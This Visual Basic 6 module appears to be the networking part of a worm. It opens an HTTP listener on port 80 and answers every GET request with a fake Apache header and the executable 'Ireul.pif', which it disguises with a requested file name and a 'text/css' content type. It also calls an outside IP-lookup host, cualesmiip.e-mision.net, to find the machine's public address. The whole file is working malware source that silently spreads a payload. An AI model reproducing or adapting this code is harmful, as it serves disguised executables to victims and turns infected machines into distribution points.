   Attribute VB_Name = "HttpMod"
   Private Declare Function WSAStartup Lib "wsock32.dll" (ByVal wVR As Long, lpWSAD As WSADATAType) As Long
   Private Declare Function WSACleanup Lib "wsock32.dll" () As Long
   Private Declare Function WSAIsBlocking Lib "wsock32.dll" () As Long
   Private Declare Function WSACancelBlockingCall Lib "wsock32.dll" () As Long

   Private Const WSADescription_Len = 256
   Private Const WSASYS_Status_Len = 128

   Private Type WSADATAType
     wversion As Integer
     wHighVersion As Integer
     szDescription(0 To WSADescription_Len) As Byte
     szSystemStatus(0 To WSASYS_Status_Len) As Byte
     iMaxSockets As Integer
     iMaxUdpDg As Integer
     lpszVendorInfo As Long
   End Type

   Private Declare Function gethostname Lib "wsock32.dll" (ByVal hostname$, ByVal HostLen As Long) As Long
   Private Declare Function gethostbyname Lib "wsock32.dll" (ByVal hostname$) As Long

   Private Type HostEnt
     h_name As Long
     h_aliases As Long
     h_addrtype As Integer
     h_length As Integer
     h_addr_list As Long
   End Type

   Private Declare Function inet_addr Lib "wsock32.dll" (ByVal cp As String) As Long

   Private Const INADDR_NONE = &HFFFF
   Private Const INADDR_ANY = &H0
   Private Const hostent_size = 16
   Private Const sockaddr_size = 16
   Private Const INVALID_SOCKET = -1
   Private Const SOCKET_ERROR = -1
   Private Const SOCK_STREAM = 1
   Private Const AF_INET = 2
   Private Const IPPROTO_TCP = 6

   Private Declare Function accept Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, addrlen As Long) As Long
   Private Declare Function htonl Lib "wsock32.dll" (ByVal hostlong As Long) As Long
   Private Declare Function htons Lib "wsock32.dll" (ByVal hostshort As Long) As Integer
   Private Declare Function socket Lib "wsock32.dll" (ByVal af As Long, ByVal s_type As Long, ByVal protocol As Long) As Long
   Private Declare Function connect Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Private Declare Function send Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Private Declare Function recv Lib "wsock32.dll" (ByVal s As Long, buf As Any, ByVal buflen As Long, ByVal flags As Long) As Long
   Private Declare Function closesocket Lib "wsock32.dll" (ByVal s As Long) As Long
   Private Declare Function bind Lib "wsock32.dll" (ByVal s As Long, addr As sockaddr, ByVal namelen As Long) As Long
   Private Declare Function listen Lib "wsock32.dll" (ByVal s As Long, ByVal backlog As Long) As Long

   Private Type sockaddr
     sin_family As Integer
     sin_port As Integer
     sin_addr As Long
     sin_zero As String * 8
   End Type

   Private Declare Function WSAAsyncSelect Lib "wsock32.dll" (ByVal s As Long, ByVal hwnd As Long, ByVal wMsg As Long, ByVal lEvent As Long) As Long

   Private Const FD_READ = &H1&
   Private Const FD_CLOSE = &H20&
   Private Const FD_ACCEPT = &H8&

   Private Declare Function InternetGetConnectedState Lib "wininet.dll" (ByRef IpdwFlags As Long, ByVal dwReserved As Long) As Long
   Private Declare Sub MemCopy Lib "kernel32" Alias "RtlMoveMemory" (Dest As Any, ByVal Src As Long, ByVal cb&)
   Private Declare Function CallWindowProc Lib "user32" Alias "CallWindowProcA" (ByVal lpPrevWndFunc As Long, ByVal hwnd As Long, ByVal Msg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   Private Declare Function SetWindowLong Lib "user32" Alias "SetWindowLongA" (ByVal hwnd As Long, ByVal nIndex As Long, ByVal dwNewLong As Long) As Long
   Private Const GWL_WNDPROC = -4
   Private lpPrevWndProc As Long
   Public ip As String

   Dim hSock As Long

   Private Function StartWinsock() As Boolean
   On Error Resume Next
   Dim StartupData As WSADATAType
   StartWinsock = IIf(WSAStartup(&H101, StartupData) = 0, True, False)
   End Function

   Private Sub EndWinsock()
   On Error Resume Next
   Dim l As Long
   If WSAIsBlocking() Then l = WSACancelBlockingCall()
   l = WSACleanup()
   End Sub

   Public Function GetLclIP()
   On Error Resume Next
   If Not (StartWinsock()) Then Call EndWinsock: Exit Function

   Dim hostname As String * 256, hostent_addr As Long
   Dim Host As HostEnt, hostip_addr As Long, temp_ip_address() As Byte
   Dim i As Integer, ip_address() As String, x As Integer

   If gethostname(hostname, 256) = -1 Then
   Exit Function
   Else
   hostname = Trim$(hostname)
   End If

   hostent_addr = gethostbyname(hostname)

   If hostent_addr = 0 Then Exit Function

   MemCopy Host, hostent_addr, LenB(Host)

   MemCopy hostip_addr, Host.h_addr_list, 4

   ReDim ip_address(5)

   Do
   ReDim temp_ip_address(1 To Host.h_length)
   MemCopy temp_ip_address(1), hostip_addr, Host.h_length

   For i = 1 To Host.h_length
   ip_address(x) = ip_address(x) & "." & temp_ip_address(i)
   Next

   ip_address(x) = Mid$(ip_address(x), 2)

   Host.h_addr_list = Host.h_addr_list + LenB(Host.h_addr_list)
   MemCopy hostip_addr, Host.h_addr_list, 4
   x = x + 1
   Loop While (hostip_addr <> 0)

   ReDim Preserve ip_address(x - 1)

   GetLclIP = ip_address()

   Call EndWinsock
   End Function

   Public Function iStat() As Boolean
   On Error Resume Next
   iStat = IIf(InternetGetConnectedState(0&, 0&) <> 0, True, False)
   End Function

   Public Sub StartHttpListen()
   On Error Resume Next
   If Not (StartWinsock) Or Not (iStat) Then EndWinsock: Exit Sub
   Call Hook(Form1.hwnd)
   hSock = ListenSock(80, Form1.hwnd, 1080)
   If hSock = INVALID_SOCKET Then Exit Sub
   Form1.Timer2.Enabled = False
   End Sub

   Private Function SendData(ByVal s As Long, vMessage As Variant) As Long
   On Error Resume Next
   Dim TheMsg() As Byte
               TheMsg = StrConv(vMessage, vbFromUnicode)
   If UBound(TheMsg) > -1 Then
       SendData = send(s, TheMsg(0), (UBound(TheMsg) - LBound(TheMsg) + 1), 0)
   End If
   End Function

   Public Function Hook(ByVal hwnd As Long)
       On Error Resume Next
       lpPrevWndProc = SetWindowLong(hwnd, GWL_WNDPROC, AddressOf WindowProc)
   End Function

   Public Sub UnHook(ByVal hwnd As Long)
       On Error Resume Next
       Call SetWindowLong(hwnd, GWL_WNDPROC, lpPrevWndProc)
   End Sub

   Public Function WindowProc(ByVal hw As Long, ByVal uMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long
   On Error Resume Next
   Dim x As Long, ReadBuffer(1000) As Byte, hCode As String

   Select Case uMsg
    Case 1080
     Select Case lParam
      Case FD_ACCEPT
      Call AcceptSock(hSock, Form1.hwnd, 1081)
     End Select

    Case 1081
     Select Case lParam
     Case FD_CLOSE
     Call closesocket(wParam)

     Case FD_READ
     x = recv(wParam, ReadBuffer(0), 1000, 0)
      If x > 0 Then hCode = StrConv(ReadBuffer, vbUnicode)
      Call EvalCode(hCode, wParam)
     End Select

     Case 1082
      Select Case lParam
      Case FD_READ
      x = recv(wParam, ReadBuffer(0), 1000, 0)
       If x > 0 Then ip = StrConv(ReadBuffer, vbUnicode)
       Call EvalIp(ip, x)
      Case FD_CLOSE
       Call closesocket(wParam)
       Call UnHook(Form1.hwnd)
       Call EndWinsock
      End Select
   End Select

       WindowProc = CallWindowProc(lpPrevWndProc, hw, uMsg, wParam, lParam)
   End Function

   Public Function ListenSock(ByVal Port As Long, ByVal hwnd As Long, wLong As Long) As Long
   On Error Resume Next
   Dim s As Long, selectops As Long
   Dim sockin As sockaddr

   sockin.sin_family = AF_INET
   sockin.sin_port = htons(Port)

   If sockin.sin_port = INVALID_SOCKET Then ListenSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = htonl(INADDR_ANY)

   If sockin.sin_addr = INADDR_NONE Then ListenSock = INVALID_SOCKET: Exit Function

   s = socket(AF_INET, SOCK_STREAM, 0)

   If s < 0 Then ListenSock = INVALID_SOCKET: Exit Function

   If bind(s, sockin, sockaddr_size) = -1 Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   selectops = FD_READ Or FD_CLOSE Or FD_ACCEPT

   If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   If listen(s, 100) Then
      If s > 0 Then Call closesocket(s)
      ListenSock = INVALID_SOCKET: Exit Function
   End If

   ListenSock = s
   End Function

   Private Function AcceptSock(ByVal sock, ByVal hwnd, ByVal wLong)
   On Error Resume Next
   Dim hClient As sockaddr, selectops As Long, s As Long

   s = accept(sock, hClient, sockaddr_size)

   If s = INVALID_SOCKET Then AcceptSock = INVALID_SOCKET: Exit Function

   selectops = FD_READ Or FD_CLOSE

   If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
      If s > 0 Then Call closesocket(s)
      AcceptSock = INVALID_SOCKET: Exit Function
   End If

   AcceptSock = s
   End Function

   Public Function RptHttp(file)
   On Error Resume Next
   Dim bFile As String, sfile As String

   sfile = Mid(file, 6, InStr(Mid(file, 6), Chr(46)) - 1)

   o = FreeFile
   Open Sp(1) & "\Ireul.pif" For Binary Access Read As #o
   bFile = Space$(LOF(o))
   Get #o, , bFile
   Close #o

   RptHttp = "HTTP/1.1 200 OK" & vbCrLf & _
   "DATE: " & Format(Date, "Ddd") & ", " & Format(Date, "dd Mmm YYYY") & " " & Format(Time, "hh:mm:ss") & " GMT" & vbCrLf & _
   "Server: Apache" & vbCrLf & _
   "Content-disposition: inline; filename=" & Chr(34) & sfile & ".pif" & Chr(34) & vbCrLf & _
   "Content-Length: " & FileLen(Sp(1) & "\Ireul.pif") & vbCrLf & _
   "Content-Type: text/css" & vbCrLf & vbCrLf

   RptHttp = RptHttp & bFile
   End Function

   Private Sub EvalCode(ByVal Code As String, ByVal lSock As Long)
   On Error Resume Next
   If Left$(UCase(Code), 3) = "GET" Then
   Call SendData(lSock, RptHttp(Code))
   End If
   End Sub

   Public Sub GetIp()
   On Error Resume Next
   If Not (StartWinsock) Or Not (iStat) Then EndWinsock: Exit Sub
   Call Hook(Form1.hwnd)
   Dim ipSock As Long
   ipSock = ConnectSock("cualesmiip.e-mision.net", Form1.hwnd, 999, 1082)
   End Sub

   Public Function ConnectSock(ByVal Host As String, ByVal hwnd As Long, Port As Long, wLong As Long) As Long
   On Error Resume Next
   Dim s As Long, selectops As Long, sockin As sockaddr

   sockin.sin_family = AF_INET
   sockin.sin_port = htons(Port)

   If sockin.sin_port = INVALID_SOCKET Then: ConnectSock = INVALID_SOCKET: Exit Function

   sockin.sin_addr = GetHostByNameAlias(Host)

   If sockin.sin_addr = INADDR_NONE Then ConnectSock = INVALID_SOCKET: Exit Function

   s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)

   If s < 0 Then ConnectSock = INVALID_SOCKET: Exit Function

    selectops = FD_READ Or FD_CLOSE

    If WSAAsyncSelect(s, hwnd, ByVal wLong, ByVal selectops) Then
       If s > 0 Then Call closesocket(s)
       ConnectSock = INVALID_SOCKET: Exit Function
    End If

   If connect(s, sockin, sockaddr_size) <> SOCKET_ERROR Then
    If s > 0 Then Call closesocket(s)
    ConnectSock = INVALID_SOCKET: Exit Function
   End If

   ConnectSock = s
   End Function

   Private Function GetHostByNameAlias(ByVal hostname) As Long
   On Error Resume Next
   Dim rgn As Long, addrList As Long, rIP As Long, getHost As HostEnt

   rIP = inet_addr(hostname)

   If rIP = INADDR_NONE Then
    rgn = gethostbyname(hostname)
     If rgn <> 0 Then
       MemCopy getHost, ByVal rgn, hostent_size
       MemCopy addrList, ByVal getHost.h_addr_list, 4
       MemCopy rIP, ByVal addrList, getHost.h_length
       Else
       rIP = INADDR_NONE
     End If
   End If

   GetHostByNameAlias = rIP
   End Function

   Private Sub EvalIp(mp, lw)
   On Error Resume Next: ip = Left$(mp, lw)
   End Sub
